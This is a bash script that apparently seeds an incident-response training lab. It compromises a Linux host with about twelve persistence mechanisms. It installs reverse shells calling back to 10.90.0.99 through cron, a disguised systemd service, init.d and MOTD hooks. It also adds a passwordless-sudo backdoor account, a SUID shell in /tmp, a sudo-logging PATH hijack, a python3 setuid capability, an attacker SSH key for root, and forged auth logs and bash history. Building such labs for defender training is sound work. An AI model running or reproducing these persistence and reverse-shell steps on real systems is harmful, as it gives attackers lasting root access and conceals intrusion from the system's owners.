#!/usr/bin/env bash
# SPOILER WARNING: this script seeds the IR lab. Don't read it until after
# you've finished the lab — it lists every persistence artifact, defeating
# the purpose of the investigation.
set -uo pipefail

# 1. Cron persistence — daily callback at 0300
cat >/etc/cron.daily/update-check <<'EOF'
#!/bin/sh
# silent callback
(sleep $((RANDOM % 60)); nc -e /bin/sh 10.90.0.99 4444) >/dev/null 2>&1 &
EOF
chmod +x /etc/cron.daily/update-check

# 2. systemd service masquerading as a system component
cat >/etc/systemd/system/sysmon-helper.service <<'EOF'
[Unit]
Description=System monitor helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/sysmon-helper
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
cat >/usr/local/bin/sysmon-helper <<'EOF'
#!/bin/sh
while true; do
  nc -z 10.90.0.99 8443 && /bin/sh -i </dev/tcp/10.90.0.99/8443 >&0 2>&1
  sleep 60
done
EOF
chmod +x /usr/local/bin/sysmon-helper

# 3. New user with sudo
useradd -m -s /bin/bash svcadm 2>/dev/null
echo "svcadm:summer2026" | chpasswd
usermod -aG sudo svcadm 2>/dev/null
echo "svcadm ALL=(ALL) NOPASSWD: ALL" >/etc/sudoers.d/svcadm
chmod 440 /etc/sudoers.d/svcadm

# 4. SUID binary in /tmp
cp /bin/bash /tmp/.sysshell
chmod 4755 /tmp/.sysshell

# 5. Modified PATH for ubuntu user (PATH hijack vector)
mkdir -p /home/ubuntu 2>/dev/null
echo 'export PATH=/home/ubuntu/.local/bin:$PATH' >>/home/ubuntu/.bashrc 2>/dev/null
mkdir -p /home/ubuntu/.local/bin 2>/dev/null
cat >/home/ubuntu/.local/bin/sudo <<'EOF'
#!/bin/sh
echo "$@" >> /tmp/.sudo-log
exec /usr/bin/sudo "$@"
EOF
chmod +x /home/ubuntu/.local/bin/sudo 2>/dev/null

# 6. Bash history with attacker traces
mkdir -p /home/ubuntu 2>/dev/null
cat >/home/ubuntu/.bash_history <<'EOF'
whoami
id
uname -a
cat /etc/issue
curl http://10.90.0.99/payload.sh -o /tmp/.x
chmod +x /tmp/.x
/tmp/.x
ls -la /etc/cron*
sudo -l
crontab -l
ss -tunap
history -c
EOF

# 7. Linux capabilities-based escalation
setcap cap_setuid+ep /usr/bin/python3 2>/dev/null || true

# 8. World-writable PATH abuse target
mkdir -p /opt/legacy-tools
chmod 777 /opt/legacy-tools
echo "/opt/legacy-tools" >>/etc/environment 2>/dev/null || true

# 9. XDG autostart-equivalent (init.d remnant)
cat >/etc/init.d/network-helper <<'EOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides: network-helper
# Required-Start: $network
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop:
# Short-Description: legacy network helper
### END INIT INFO
nohup /usr/local/bin/sysmon-helper >/dev/null 2>&1 &
EOF
chmod +x /etc/init.d/network-helper

# 10. SSH authorized_keys for root
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat >>/root/.ssh/authorized_keys <<'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lab-key-attacker-controlled
EOF
chmod 600 /root/.ssh/authorized_keys

# 11. MOTD persistence (CCTC technique)
cat >/etc/update-motd.d/99-helper <<'EOF'
#!/bin/sh
nohup /usr/local/bin/sysmon-helper >/dev/null 2>&1 &
EOF
chmod +x /etc/update-motd.d/99-helper

# 12. Auth log seeded with the initial access event
cat >>/var/log/auth.log <<EOF
$(date -d '6 hours ago' '+%b %d %H:%M:%S') compromised-ubuntu sshd[1234]: Accepted password for ubuntu from 185.55.32.10 port 51322 ssh2
$(date -d '5 hours 55 minutes ago' '+%b %d %H:%M:%S') compromised-ubuntu sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
$(date -d '4 hours ago' '+%b %d %H:%M:%S') compromised-ubuntu useradd[2001]: new user: name=svcadm, UID=1001
EOF

echo "Lab compromise seeded. ~12 persistence artifacts in place."
